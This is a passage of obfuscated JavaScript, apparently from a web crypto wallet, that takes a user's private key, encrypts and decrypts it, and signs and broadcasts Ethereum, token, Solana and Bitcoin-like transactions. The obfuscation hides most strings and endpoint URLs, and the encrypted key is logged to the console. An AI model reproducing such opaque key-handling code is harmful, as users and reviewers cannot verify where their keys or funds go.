_0x3a3505[_0x20e626(0x227)][_0x20e626(0x18d)]()[_0x20e626(0x126)](),_0x4edb79=(_0x3a2d99*Math[_0x20e626(0x1f2)](0xa,_0x35ef7c))[_0x20e626(0x1d5)]();console[_0x20e626(0x109)](_0x20e626(0xe2),_0x35ef7c),console[_0x20e626(0x109)]('tokenAmount:',_0x4edb79),_0x197bae=web3[_0x20e626(0x218)][_0x20e626(0x24f)][_0x20e626(0x2b2)]({'name':_0x20e626(0x2b5),'type':_0x20e626(0x13a),'inputs':[{'type':_0x20e626(0x1f7),'name':'to'},{'type':_0x20e626(0x277),'name':_0x20e626(0x1ae)}]},[_0x210c82,_0x4edb79]),console[_0x20e626(0x109)]('txData:',_0x197bae),_0x11693b={'from':web3['utils'][_0x20e626(0x1be)](_0x228c0a),'nonce':web3[_0x20e626(0x11a)][_0x20e626(0x1be)](_0x2fa57d),'gasPrice':_0x466553,'to':_0x57a154,'data':web3[_0x20e626(0x11a)][_0x20e626(0x1be)](_0x197bae),'chainId':web3['utils'][_0x20e626(0x1be)](GlobalChainID)};}else _0x11693b={'from':web3['utils'][_0x20e626(0x1be)](_0x228c0a),'nonce':web3[_0x20e626(0x11a)][_0x20e626(0x1be)](_0x2fa57d),'gasPrice':_0x466553,'to':_0x210c82,'value':web3[_0x20e626(0x11a)]['toHex'](web3[_0x20e626(0x11a)][_0x20e626(0xfb)](_0x3a2d99,_0x20e626(0x28a))),'data':web3[_0x20e626(0x11a)][_0x20e626(0x1be)](_0x197bae),'chainId':web3[_0x20e626(0x11a)][_0x20e626(0x1be)](GlobalChainID)};console[_0x20e626(0x109)](_0x20e626(0x18b),web3[_0x20e626(0x11a)]['toHex'](web3[_0x20e626(0x11a)][_0x20e626(0xfb)](_0x3a2d99,_0x20e626(0x28a))));var _0x1b21bd;try{_0x1b21bd=await web3[_0x20e626(0x218)]['estimateGas'](_0x11693b);}catch(_0x26bed0){console[_0x20e626(0x109)](_0x20e626(0x233),_0x26bed0),ShowToast('EstimateGas\x20error,please\x20make\x20sure\x20your\x20balance\x20is\x20enough.'),stopSpinner('StartSendButtonID');return;}_0x1b21bd=web3[_0x20e626(0x11a)][_0x20e626(0x1be)](_0x1b21bd),console[_0x20e626(0x109)](_0x20e626(0x1e0),_0x1b21bd),_0x11693b['gasLimit']=_0x1b21bd,console[_0x20e626(0x109)](_0x20e626(0x1ed),_0x11693b),document[_0x20e626(0xea)](_0x20e626(0x29a))[_0x20e626(0x1ae)]=JSON[_0x20e626(0x1a5)](_0x11693b,null,0x2),stopSpinner('StartSendButtonID');}async function signTransaction(){var _0x217b89=_0x28cfff;if(document[_0x217b89(0xea)]('UserInputtxID')[_0x217b89(0x1ae)]==''||document[_0x217b89(0xea)](_0x217b89(0x208))[_0x217b89(0x1ae)]==''){console['log'](_0x217b89(0xe4)),ShowToast(_0x217b89(0xe4));return;}var _0x3d0a4c=JSON[_0x217b89(0x2ba)](document[_0x217b89(0xea)](_0x217b89(0x257))[_0x217b89(0x1ae)]),_0x312d72=document['getElementById']('PrivateKeyID')['value'];console[_0x217b89(0x109)](_0x217b89(0x1df),_0x3d0a4c);var _0x2b0c90=new ethereumjs['Tx'](_0x3d0a4c);document[_0x217b89(0xea)](_0x217b89(0x29a))['value']=JSON['stringify'](_0x2b0c90,null,0x2);var _0x53cf57=ethereumjs[_0x217b89(0x1fb)][_0x217b89(0x144)](_0x312d72);_0x2b0c90[_0x217b89(0x276)](_0x53cf57);var _0x225b61='0x'+_0x2b0c90[_0x217b89(0x17c)]()[_0x217b89(0x1d5)](_0x217b89(0x28f));console[_0x217b89(0x109)]('serializedTx:',_0x225b61),document[_0x217b89(0xea)](_0x217b89(0x154))[_0x217b89(0x1ae)]=_0x225b61;}async function BroadcastTransaction(){var _0x3ac391=_0x28cfff;if(document[_0x3ac391(0xea)]('UserInputSignedHashID')[_0x3ac391(0x1ae)]==''){console[_0x3ac391(0x109)](_0x3ac391(0x235)),ShowToast(_0x3ac391(0x235));return;}var _0x245df3=document[_0x3ac391(0xea)](_0x3ac391(0x2e8))['value'];web3[_0x3ac391(0x218)]['sendSignedTransaction'](_0x245df3)['on'](_0x3ac391(0x123),function(_0x3eb8ff){var _0x4d1239=_0x3ac391;console[_0x4d1239(0x109)](_0x4d1239(0x134)+_0x3eb8ff);})['on'](_0x3ac391(0x1ec),function(_0x7a939){var _0x182699=_0x3ac391;console['log'](_0x182699(0xdf),_0x7a939),console['log'](_0x182699(0x22f)+JSON[_0x182699(0x1a5)](_0x7a939));})['on'](_0x3ac391(0x299),function(_0xdedc61){var _0x3f3ce6=_0x3ac391;console[_0x3f3ce6(0x299)](_0x3f3ce6(0x29b),_0xdedc61),console['log']('Transaction\x20Error:\x20'+JSON[_0x3f3ce6(0x1a5)](_0xdedc61));});}var selector=$(_0x28cfff(0x1e5));$['each'](CoinsJson,function(_0x311a17,_0x18952f){var _0x1bbeb8=_0x28cfff;selector[_0x1bbeb8(0x223)]('<option\x20value=\x22'+_0x311a17+'\x22>'+_0x311a17+_0x1bbeb8(0x200));});var defaultCrypto=_0x28cfff(0xdc);document[_0x28cfff(0xea)](_0x28cfff(0x237))[_0x28cfff(0x121)]=_0x28cfff(0x282),selector[_0x28cfff(0x1dd)](defaultCrypto),document['getElementById']('SendETHTitle')['innerHTML']=_0x28cfff(0x163)+CoinsJson[defaultCrypto][_0x28cfff(0x2df)],selector[_0x28cfff(0x242)](_0x28cfff(0x2fe)),selector['on']('change',function(){var _0x111393=_0x28cfff;console[_0x111393(0x109)]('MainBlockchainSelector\x20on\x20change..'),selectedCrypto=$(this)[_0x111393(0x1dd)]();var _0x44b5c7=$(_0x111393(0x2e7));if(selectedCrypto){var _0x4351bb=CoinsJson[selectedCrypto];document['getElementById'](_0x111393(0x237))[_0x111393(0x121)]=_0x111393(0x224)+_0x4351bb[_0x111393(0x2df)]+'.png',document[_0x111393(0xea)](_0x111393(0x274))[_0x111393(0x1cd)]=_0x111393(0x163)+_0x4351bb[_0x111393(0x2df)],GlobalChainID=_0x4351bb[_0x111393(0x262)],web3=new Web3(new Web3[(_0x111393(0xf3))][(_0x111393(0x2b8))](_0x4351bb[_0x111393(0x25c)])),console[_0x111393(0x109)](_0x111393(0x20a),GlobalChainID),document[_0x111393(0xea)](_0x111393(0x307))['href']=_0x4351bb['BlockExplorer']+_0x111393(0x14c),document[_0x111393(0xea)](_0x111393(0x307))['textContent']=_0x4351bb[_0x111393(0x20c)]+_0x111393(0x14c),console[_0x111393(0x109)](_0x111393(0x2be),document[_0x111393(0xea)]('MainBlockchainSelector')[_0x111393(0x12b)]),localStorage[_0x111393(0x245)]('MainBlockchainSelector',document[_0x111393(0xea)]('MainBlockchainSelector')[_0x111393(0x12b)]),GetBalanceRun(_0x111393(0x26b));}else _0x44b5c7['html']('');});var privateKeyInput=document['getElementById'](_0x28cfff(0x1c8)),timeoutId;privateKeyInput[_0x28cfff(0x1d6)](_0x28cfff(0x206),function(){var _0x415345=_0x28cfff;document[_0x415345(0xea)](_0x415345(0x28d))['innerHTML']='',console[_0x415345(0x109)](_0x415345(0x12d));var _0x3ec55b=document[_0x415345(0xea)]('MainBlockchainSelector')['value'];if(CoinsJson[_0x3ec55b][_0x415345(0x1d3)]=='BitcoinLike'){if(!isValidBitcoinLikePrivateKey(privateKeyInput[_0x415345(0x1ae)])){console[_0x415345(0x109)](_0x415345(0x2d0));return;}CurrentEncryptedPrivateKey=CryptoJS['AES'][_0x415345(0x296)](privateKeyInput[_0x415345(0x1ae)],pass)[_0x415345(0x1d5)]();}else{if(CoinsJson[_0x3ec55b][_0x415345(0x1d3)]==_0x415345(0x114)){if(!isValidEVMPrivateKey(privateKeyInput[_0x415345(0x1ae)])){console[_0x415345(0x109)]('wrong\x20evm\x20private\x20key...');return;}}else{if(CoinsJson[_0x3ec55b]['NetworkType']==_0x415345(0x2f7)){}}}clearTimeout(timeoutId),timeoutId=setTimeout(function(){var _0x1063be=_0x415345;GetBalanceRun(_0x1063be(0x24a));},0x7d0);});async function GetBalanceRun(_0x526444){var _0x3303e6=_0x28cfff;document['getElementById'](_0x3303e6(0x13d))[_0x3303e6(0x1cd)]='',console[_0x3303e6(0x109)](_0x3303e6(0x179),_0x526444);if(CurrentEncryptedPrivateKey==''){console[_0x3303e6(0x109)](_0x3303e6(0x17e));return;}var _0x2f8079='';if(_0x526444=='FromMainUI')_0x2f8079=await DecryptAccount(CurrentEncryptedPrivateKey);else{if(_0x526444=='FromSendUI')_0x2f8079=document['getElementById'](_0x3303e6(0x1c8))['value'][_0x3303e6(0x1c2)]();else return;}var _0x200e9f=document['getElementById'](_0x3303e6(0x14b))[_0x3303e6(0x1ae)];if(_0x200e9f==_0x3303e6(0x2f7)){console[_0x3303e6(0x109)]('is\x20solana');const _0x209b96=solanaWeb3[_0x3303e6(0x285)]['fromSecretKey'](Uint8Array['from'](Base58[_0x3303e6(0x1fe)](_0x2f8079)))[_0x3303e6(0x2a1)][_0x3303e6(0x1d5)]();console[_0x3303e6(0x109)](_0x3303e6(0x2fc),_0x209b96),console[_0x3303e6(0x109)](_0x3303e6(0x2f1),CoinsJson[_0x3303e6(0x2f7)][_0x3303e6(0x25c)]);const _0x2e46d5=new solanaWeb3[(_0x3303e6(0x19a))](CoinsJson[_0x3303e6(0x2f7)][_0x3303e6(0x25c)]);var _0x573797=new solanaWeb3[(_0x3303e6(0x1ab))](_0x209b96);const _0x468eec=await _0x2e46d5[_0x3303e6(0x24d)](_0x573797);console[_0x3303e6(0x109)]('Balance:',_0x468eec/solanaWeb3['LAMPORTS_PER_SOL'],_0x3303e6(0x270)),document['getElementById'](_0x3303e6(0x247))[_0x3303e6(0x1cd)]=_0x3303e6(0x23d)+_0x468eec/solanaWeb3[_0x3303e6(0x120)],document[_0x3303e6(0xea)](_0x3303e6(0x28d))[_0x3303e6(0x1cd)]=_0x209b96;return;}else{if(CoinsJson[_0x200e9f][_0x3303e6(0x1d3)]=='BitcoinLike'){console[_0x3303e6(0x109)]('get\x20balance\x20of\x20',_0x200e9f),await ChangeBitcoinLikeParameter(_0x200e9f);var _0x39808d=coinjs[_0x3303e6(0x255)](_0x2f8079)[_0x3303e6(0x1f7)];console['log']('FromAddress:',_0x39808d),document['getElementById'](_0x3303e6(0x28d))[_0x3303e6(0x1cd)]=_0x3303e6(0x2bd)+_0x39808d,document['getElementById'](_0x3303e6(0x241))['innerHTML']=_0x39808d;var _0x26400a=CoinsJson[_0x200e9f][_0x3303e6(0x2df)][_0x3303e6(0x107)](),_0x21cb4d=await FetchJSON(_0x3303e6(0x14d)+_0x26400a+'/main/addrs/'+_0x39808d+'?includeScript=true&unspentOnly=true',_0x3303e6(0x20b));BitcoinLikeBalanceData=_0x21cb4d;var _0x16c8b4=parseFloat(_0x21cb4d[_0x3303e6(0x166)])/0x5f5e100,_0x14b959=parseFloat(_0x21cb4d[_0x3303e6(0x202)])/0x5f5e100;console['log']('data\x20final_balance:',_0x16c8b4),console[_0x3303e6(0x109)]('unconfirmed_balance:',_0x14b959),document[_0x3303e6(0xea)](_0x3303e6(0x247))[_0x3303e6(0x1cd)]=_0x3303e6(0x23d)+_0x16c8b4,document[_0x3303e6(0xea)]('ThisBalanceID')['innerHTML']=_0x16c8b4+'\x20'+CoinsJson[_0x200e9f][_0x3303e6(0x2df)],_0x14b959!==0x0&&(document[_0x3303e6(0xea)]('UnconfirmedBalanceID')[_0x3303e6(0x1cd)]='Unconfirmed:'+_0x14b959+'\x20'+CoinsJson[_0x200e9f]['symbol']);}else{if(CoinsJson[_0x200e9f][_0x3303e6(0x1d3)]==_0x3303e6(0x114)){web3=new Web3(new Web3[(_0x3303e6(0xf3))][(_0x3303e6(0x2b8))](CoinsJson[_0x200e9f]['RPCURL']));var _0x5e6269=web3[_0x3303e6(0x218)][_0x3303e6(0x1c1)][_0x3303e6(0x2fa)](_0x2f8079)[_0x3303e6(0x1f7)];document[_0x3303e6(0xea)](_0x3303e6(0x28d))[_0x3303e6(0x1cd)]=_0x5e6269,console[_0x3303e6(0x109)](_0x3303e6(0x1c6),_0x5e6269),web3[_0x3303e6(0x218)]['getBalance'](_0x5e6269,(_0x28d5b5,_0x108c7b)=>{var _0x2dac60=_0x3303e6;if(!_0x28d5b5){const _0x182564=web3['utils']['fromWei'](_0x108c7b,_0x2dac60(0x28a));document[_0x2dac60(0xea)](_0x2dac60(0x247))[_0x2dac60(0x1cd)]=_0x182564+'\x20'+CoinsJson[_0x200e9f][_0x2dac60(0x2df)],document[_0x2dac60(0xea)](_0x2dac60(0x2d3))[_0x2dac60(0x1cd)]=_0x182564+'\x20'+CoinsJson[_0x200e9f]['symbol'],console[_0x2dac60(0x109)]('Balance\x20of\x20'+_0x5e6269+':\x20'+_0x182564+_0x2dac60(0x141));}else console[_0x2dac60(0x299)](_0x28d5b5);});}}}}const html5QrCode=new Html5Qrcode('qr-container'),qrCodeSuccessCallback=_0x1de9dd=>{var _0x569703=_0x28cfff;console['log'](_0x569703(0xd6),_0x1de9dd),document['getElementById'](_0x569703(0x257))['value']=_0x1de9dd,html5QrCode['stop'](),$('#qrModal')[_0x569703(0x2b9)]('hide');};$(_0x28cfff(0x125))['on']('shown.bs.modal',function(){var _0x1ac26d=_0x28cfff;html5QrCode['start']({'facingMode':_0x1ac26d(0x157)},{'fps':0xa,'qrbox':0xfa},qrCodeSuccessCallback);}),$('#qrModal')['on'](_0x28cfff(0x171),function(){var _0x4e1d63=_0x28cfff;html5QrCode[_0x4e1d63(0x14f)]();});function togglePassword(){var _0x2e3779=_0x28cfff,_0x2f54c5=document[_0x2e3779(0xea)](_0x2e3779(0x208));_0x2f54c5[_0x2e3779(0x217)]===_0x2e3779(0x249)?_0x2f54c5['type']=_0x2e3779(0x2ab):_0x2f54c5['type']='password';}document[_0x28cfff(0xea)](_0x28cfff(0xd3))[_0x28cfff(0x1d6)]('click',function(){var _0x11c71a=_0x28cfff;this[_0x11c71a(0x1da)]=!![],document[_0x11c71a(0xea)](_0x11c71a(0x234))['classList'][_0x11c71a(0x25b)](_0x11c71a(0x15f)),document['getElementById']('buttonText')[_0x11c71a(0x112)][_0x11c71a(0x129)](_0x11c71a(0x15f));});async function stopSpinner(_0x16e613){try{setTimeout(function(){var _0x1d4357=_0xfecc;document[_0x1d4357(0xea)](_0x1d4357(0xd3))['disabled']=![],document[_0x1d4357(0xea)](_0x1d4357(0x234))[_0x1d4357(0x112)][_0x1d4357(0x129)](_0x1d4357(0x15f)),document[_0x1d4357(0xea)]('buttonText')['classList']['remove'](_0x1d4357(0x15f));},0x3e8);}catch{}}async function StartSend(){var _0x24aa5b=_0x28cfff,_0x55de2e=document[_0x24aa5b(0xea)]('toAddress')[_0x24aa5b(0x1ae)],_0x35b88=document[_0x24aa5b(0xea)](_0x24aa5b(0x20d))[_0x24aa5b(0x1ae)],_0x21f7b6=document[_0x24aa5b(0xea)](_0x24aa5b(0x108))[_0x24aa5b(0x1ae)];if(_0x55de2e==''||_0x35b88==''||_0x21f7b6==''){document[_0x24aa5b(0xea)](_0x24aa5b(0x239))[_0x24aa5b(0x2ac)]='field\x20should\x20not\x20be\x20empty',await stopSpinner('StartSendButtonID');return;}if(isNaN(_0x35b88)||isNaN(_0x21f7b6)){document[_0x24aa5b(0xea)](_0x24aa5b(0x239))[_0x24aa5b(0x2ac)]='Please\x20enter\x20a\x20valid\x20number.',stopSpinner(_0x24aa5b(0xd3));return;}console[_0x24aa5b(0x109)]('EVM:',CoinsJson[document['getElementById'](_0x24aa5b(0x14b))[_0x24aa5b(0x1ae)]]['NetworkType']);var _0x2d2a3a=document[_0x24aa5b(0xea)](_0x24aa5b(0x14b))[_0x24aa5b(0x1ae)];CoinsJson[_0x2d2a3a][_0x24aa5b(0x1d3)]==_0x24aa5b(0x114)&&(SendToken?(console[_0x24aa5b(0x109)]('send\x20token'),sendTokens()):(console[_0x24aa5b(0x109)](_0x24aa5b(0x21f)),sendEther())),document[_0x24aa5b(0xea)](_0x24aa5b(0x14b))['value']==_0x24aa5b(0x2f7)&&sendSolana(),CoinsJson[_0x2d2a3a][_0x24aa5b(0x1d3)]=='BitcoinLike'&&SendBitcoinLikeWithBitcoinjs(_0x2d2a3a);}async function sendEther(){var _0x5f2981=_0x28cfff;console[_0x5f2981(0x109)](_0x5f2981(0x1eb));const _0x5b8365=document['getElementById']('toAddress'),_0xbb1c79=document[_0x5f2981(0xea)](_0x5f2981(0x20d)),_0x3c12fb=document[_0x5f2981(0xea)]('result'),_0x571bc4=_0x5b8365['value'][_0x5f2981(0x1c2)](),_0x5c41f1=parseFloat(_0xbb1c79[_0x5f2981(0x1ae)]);var _0x1deccc=document[_0x5f2981(0xea)]('MainBlockchainSelector')[_0x5f2981(0x1ae)];if(!_0x571bc4||!_0x571bc4['match'](/^0x[a-fA-F0-9]{40}$/)||isNaN(_0x5c41f1)||_0x5c41f1<=0x0){ShowToast(_0x5f2981(0x2b4));return;}try{web3=new Web3(new Web3[(_0x5f2981(0xf3))][(_0x5f2981(0x2b8))](CoinsJson[_0x1deccc]['RPCURL'])),console['log'](_0x5f2981(0x27d),CurrentEncryptedPrivateKey);var _0x53ccf3=await DecryptAccount(CurrentEncryptedPrivateKey);const _0x43b86a=web3['eth'][_0x5f2981(0x1c1)][_0x5f2981(0x2fa)](_0x53ccf3),_0x29db3e=await web3[_0x5f2981(0x218)]['getGasPrice'](),_0x1e6e25={'from':_0x43b86a[_0x5f2981(0x1f7)],'to':_0x571bc4,'value':web3['utils'][_0x5f2981(0xfb)](_0x5c41f1[_0x5f2981(0x1d5)](),_0x5f2981(0x28a)),'gasPrice':_0x29db3e,'nonce':await web3[_0x5f2981(0x218)]['getTransactionCount'](_0x43b86a[_0x5f2981(0x1f7)])};var _0x434500;try{_0x434500=await web3['eth'][_0x5f2981(0x105)](_0x1e6e25);}catch(_0x43cd5a){console['log'](_0x5f2981(0x233),_0x43cd5a),ShowToast('EstimateGas\x20error,please\x20make\x20sure\x20your\x20balance\x20is\x20enough.'),stopSpinner(_0x5f2981(0xd3));return;}_0x434500=web3[_0x5f2981(0x11a)]['toHex'](_0x434500),console[_0x5f2981(0x109)](_0x5f2981(0x1e0),_0x434500),_0x1e6e25[_0x5f2981(0x155)]=_0x434500;const _0x97e6b4=await web3['eth'][_0x5f2981(0x1c1)][_0x5f2981(0x2cb)](_0x1e6e25,_0x53ccf3);await web3[_0x5f2981(0x218)][_0x5f2981(0x13f)](_0x97e6b4[_0x5f2981(0x15e)])['once'](_0x5f2981(0x123),function(_0x3c4c05){var _0x1d24e4=_0x5f2981,_0x556889=_0x1d24e4(0x185);document[_0x1d24e4(0xea)](_0x1d24e4(0x214))[_0x1d24e4(0x1cd)]=CoinsJson[_0x1deccc]['BlockExplorer']+_0x1d24e4(0x302)+_0x3c4c05+_0x556889,stopSpinner(_0x1d24e4(0xd3));})['then'](function(_0x3a89f4){var _0x44ee7=_0x5f2981;console[_0x44ee7(0x109)]('Approval\x20receipt:',_0x3a89f4),document['getElementById'](_0x44ee7(0x239))['style'][_0x44ee7(0x205)]=_0x44ee7(0x173),stopSpinner(_0x44ee7(0xd3));})['catch'](function(_0x41dc2f){var _0x40573b=_0x5f2981;console[_0x40573b(0x299)](_0x40573b(0x260),_0x41dc2f),stopSpinner(_0x40573b(0xd3));});}catch(_0x7dc5ee){_0x3c12fb['textContent']='Error\x20occurred\x20while\x20sending\x20Ether',console['error'](_0x7dc5ee);}}async function sendTokens(){var _0x1c66e4=_0x28cfff,_0x32bebb=document[_0x1c66e4(0xea)](_0x1c66e4(0x14b))[_0x1c66e4(0x1ae)];const _0x4a8c82=document['getElementById'](_0x1c66e4(0x1ce)),_0x3413f7=document[_0x1c66e4(0xea)]('amount'),_0x11b20a=document['getElementById'](_0x1c66e4(0x23b))['value'],_0x199383=document['getElementById'](_0x1c66e4(0x239));console[_0x1c66e4(0x109)](_0x1c66e4(0x27d),CurrentEncryptedPrivateKey);const _0xf4d9c6=await DecryptAccount(CurrentEncryptedPrivateKey),_0x5a40b0=_0x4a8c82[_0x1c66e4(0x1ae)][_0x1c66e4(0x1c2)](),_0x213286=parseFloat(_0x3413f7[_0x1c66e4(0x1ae)]);if(!_0xf4d9c6||!_0x5a40b0||isNaN(_0x213286)||_0x213286<=0x0){ShowToast(_0x1c66e4(0x2b4));return;}try{const _0x259213=[{'constant':!![],'inputs':[],'name':_0x1c66e4(0x15c),'outputs':[{'name':'','type':'string'}],'payable':![],'stateMutability':_0x1c66e4(0x1c9),'type':'function'},{'constant':![],'inputs':[{'name':_0x1c66e4(0x271),'type':_0x1c66e4(0x1f7)},{'name':_0x1c66e4(0x2c6),'type':_0x1c66e4(0x277)}],'name':_0x1c66e4(0x1ac),'outputs':[{'name':'','type':_0x1c66e4(0x2da)}],'payable':![],'stateMutability':_0x1c66e4(0x23f),'type':_0x1c66e4(0x13a)},{'constant':!![],'inputs':[],'name':_0x1c66e4(0x165),'outputs':[{'name':'','type':'uint256'}],'payable':![],'stateMutability':_0x1c66e4(0x1c9),'type':'function'},{'constant':![],'inputs':[{'name':_0x1c66e4(0x2c1),'type':_0x1c66e4(0x1f7)},{'name':_0x1c66e4(0x2f3),'type':_0x1c66e4(0x1f7)},{'name':'_value','type':_0x1c66e4(0x277)}],'name':_0x1c66e4(0x221),'outputs':[{'name':'','type':_0x1c66e4(0x2da)}],'payable':![],'stateMutability':'nonpayable','type':'function'},{'constant':!![],'inputs':[],'name':_0x1c66e4(0x18d),'outputs':[{'name':'','type':_0x1c66e4(0x222)}],'payable':![],'stateMutability':_0x1c66e4(0x1c9),'type':'function'},{'constant':!![],'inputs':[{'name':_0x1c66e4(0x148),'type':_0x1c66e4(0x1f7)}],'name':'balanceOf','outputs':[{'name':'balance','type':_0x1c66e4(0x277)}],'payable':![],'stateMutability':_0x1c66e4(0x1c9),'type':'function'},{'constant':!![],'inputs':[],'name':_0x1c66e4(0x2df),'outputs':[{'name':'','type':_0x1c66e4(0x184)}],'payable':![],'stateMutability':_0x1c66e4(0x1c9),'type':_0x1c66e4(0x13a)},{'constant':![],'inputs':[{'name':'_to','type':_0x1c66e4(0x1f7)},{'name':_0x1c66e4(0x2c6),'type':'uint256'}],'name':_0x1c66e4(0x2b5),'outputs':[{'name':'','type':_0x1c66e4(0x2da)}],'payable':![],'stateMutability':_0x1c66e4(0x23f),'type':_0x1c66e4(0x13a)},{'constant':!![],'inputs':[{'name':_0x1c66e4(0x148),'type':_0x1c66e4(0x1f7)},{'name':_0x1c66e4(0x271),'type':_0x1c66e4(0x1f7)}],'name':_0x1c66e4(0x288),'outputs':[{'name':'','type':_0x1c66e4(0x277)}],'payable':![],'stateMutability':_0x1c66e4(0x1c9),'type':_0x1c66e4(0x13a)},{'payable':!![],'stateMutability':_0x1c66e4(0x20f),'type':_0x1c66e4(0x203)},{'anonymous':![],'inputs':[{'indexed':!![],'name':'owner','type':'address'},{'indexed':!![],'name':_0x1c66e4(0x29c),'type':_0x1c66e4(0x1f7)},{'indexed':![],'name':_0x1c66e4(0x1ae),'type':'uint256'}],'name':'Approval','type':_0x1c66e4(0x266)},{'anonymous':![],'inputs':[{'indexed':!![],'name':'from','type':_0x1c66e4(0x1f7)},{'indexed':!![],'name':'to','type':_0x1c66e4(0x1f7)},{'indexed':![],'name':_0x1c66e4(0x1ae),'type':_0x1c66e4(0x277)}],'name':_0x1c66e4(0x127),'type':_0x1c66e4(0x266)}];console['log']('CoinsJson[CoinType].RPCURL:',CoinsJson[_0x32bebb][_0x1c66e4(0x25c)]),web3=new Web3(new Web3['providers'][(_0x1c66e4(0x2b8))](CoinsJson[_0x32bebb][_0x1c66e4(0x25c)]));const _0x3b7040=web3[_0x1c66e4(0x218)][_0x1c66e4(0x1c1)][_0x1c66e4(0x2fa)](_0xf4d9c6),_0x4110ca=new web3['eth'][(_0x1c66e4(0xd5))](_0x259213,_0x11b20a),_0x49a5ca=await _0x4110ca[_0x1c66e4(0x227)][_0x1c66e4(0x18d)]()['call']();var _0xbb5fca=(_0x213286*Math['pow'](0xa,_0x49a5ca))[_0x1c66e4(0x1d5)]();console[_0x1c66e4(0x109)](_0x1c66e4(0xe2),_0x49a5ca),console['log']('tokenAmountInWei:',_0xbb5fca),console[_0x1c66e4(0x109)](_0x1c66e4(0x2e9),_0xbb5fca);const _0x5d1cea=_0x4110ca[_0x1c66e4(0x227)][_0x1c66e4(0x2b5)](_0x5a40b0,_0xbb5fca['toString']())[_0x1c66e4(0x1d2)](),_0x409700=await web3[_0x1c66e4(0x218)]['getGasPrice'](),_0x2910ed={'from':_0x3b7040[_0x1c66e4(0x1f7)],'to':_0x11b20a,'gasPrice':_0x409700,'data':_0x5d1cea,'nonce':await web3[_0x1c66e4(0x218)]['getTransactionCount'](_0x3b7040[_0x1c66e4(0x1f7)])};var _0x749623;try{_0x749623=await web3['eth'][_0x1c66e4(0x105)](_0x2910ed);}catch(_0x6260fd){console[_0x1c66e4(0x109)](_0x1c66e4(0x233),_0x6260fd),ShowToast(_0x1c66e4(0x233)),stopSpinner(_0x1c66e4(0xd3));return;}_0x749623=web3[_0x1c66e4(0x11a)][_0x1c66e4(0x1be)](_0x749623),console[_0x1c66e4(0x109)](_0x1c66e4(0x1e0),_0x749623),_0x2910ed[_0x1c66e4(0x155)]=_0x749623;const _0x4624ae=await web3[_0x1c66e4(0x218)][_0x1c66e4(0x1c1)][_0x1c66e4(0x2cb)](_0x2910ed,_0xf4d9c6);await web3[_0x1c66e4(0x218)][_0x1c66e4(0x13f)](_0x4624ae[_0x1c66e4(0x15e)])[_0x1c66e4(0x213)](_0x1c66e4(0x123),function(_0x384a32){var _0x1664a0=_0x1c66e4,_0x5c119c=_0x1664a0(0x185);document[_0x1664a0(0xea)](_0x1664a0(0x214))[_0x1664a0(0x1cd)]=CoinsJson[_0x32bebb][_0x1664a0(0x20c)]+_0x1664a0(0x302)+_0x384a32+_0x5c119c,stopSpinner(_0x1664a0(0xd3));})['then'](function(_0x59c0dd){var _0x53992e=_0x1c66e4;console[_0x53992e(0x109)](_0x53992e(0x1ea),_0x59c0dd),document[_0x53992e(0xea)]('result')[_0x53992e(0xd8)][_0x53992e(0x205)]=_0x53992e(0x173),stopSpinner(_0x53992e(0xd3));})[_0x1c66e4(0x1e4)](function(_0x297059){var _0x392772=_0x1c66e4;console[_0x392772(0x299)](_0x392772(0x260),_0x297059),stopSpinner(_0x392772(0xd3));});}catch(_0x50902c){_0x199383[_0x1c66e4(0x251)]=_0x1c66e4(0x2f8),console[_0x1c66e4(0x299)](_0x50902c),stopSpinner(_0x1c66e4(0xd3));}}async function sendSolana(){var _0x21830c=_0x28cfff;console['log']('sendSolana...');const _0x1f7606=document['getElementById'](_0x21830c(0x1c8)),_0x5f12a9=document['getElementById'](_0x21830c(0x1ce)),_0x20473e=document[_0x21830c(0xea)](_0x21830c(0x20d)),_0x2c9f29=document[_0x21830c(0xea)](_0x21830c(0x239)),_0x14f746=_0x1f7606[_0x21830c(0x1ae)]['trim'](),_0x21d0f7=_0x5f12a9[_0x21830c(0x1ae)][_0x21830c(0x1c2)](),_0x28fc1b=parseFloat(_0x20473e[_0x21830c(0x1ae)]['trim']()),_0x2cece4=new solanaWeb3[(_0x21830c(0x19a))](CoinsJson[document['getElementById'](_0x21830c(0x14b))[_0x21830c(0x1ae)]][_0x21830c(0x25c)]),_0x234c36=solanaWeb3['Keypair']['fromSecretKey'](Uint8Array[_0x21830c(0x15b)](Base58[_0x21830c(0x1fe)](_0x14f746)));try{const _0x5cb635=new solanaWeb3[(_0x21830c(0x10c))]()[_0x21830c(0x129)](solanaWeb3[_0x21830c(0x138)][_0x21830c(0x2b5)]({'fromPubkey':_0x234c36[_0x21830c(0x2a1)],'toPubkey':new solanaWeb3['PublicKey'](_0x21d0f7),'lamports':solanaWeb3['LAMPORTS_PER_SOL']*_0x28fc1b}));_0x5cb635[_0x21830c(0x226)]=_0x234c36[_0x21830c(0x2a1)];const _0x2d7795=await solanaWeb3[_0x21830c(0x2ff)](_0x2cece4,_0x5cb635,[_0x234c36]);console[_0x21830c(0x109)](_0x21830c(0x19b),_0x2d7795);}catch(_0x3a861a){console[_0x21830c(0x299)](_0x21830c(0x128),_0x3a861a);}}function rawSubmitblockcypher1(_0x5c8df2,_0x5dcab7){var _0x54c485=_0x28cfff;$[_0x54c485(0x287)]({'type':_0x54c485(0x11b),'url':_0x54c485(0x14d)+_0x5dcab7+_0x54c485(0x11c),'data':JSON[_0x54c485(0x1a5)]({'tx':_0x5c8df2}),'error':function(_0x471a1d){var _0x53a7fb=_0x54c485,_0x171b36=_0x53a7fb(0x2b7)+_0x471a1d[_0x53a7fb(0x21c)][_0x53a7fb(0x1d5)]()+'\x20'+_0x471a1d['statusText'];},'success':function(_0x22e814){var _0x1c95ef=_0x54c485;_0x22e814['tx']&&_0x22e814['tx'][_0x1c95ef(0x2b3)]?console[_0x1c95ef(0x109)](_0x1c95ef(0x27a),_0x22e814['tx'][_0x1c95ef(0x2b3)]):console['log'](_0x1c95ef(0x194));},'complete':function(_0x3dd818,_0xffe9eb){var _0x2810f4=_0x54c485;console[_0x2810f4(0x109)](_0x2810f4(0x275));}});}async function rawSubmitblockcypher(_0x170198,_0x3e20f3,_0xd1e432){var _0x3fc356=_0x28cfff;try{const _0x5ea9c7=await 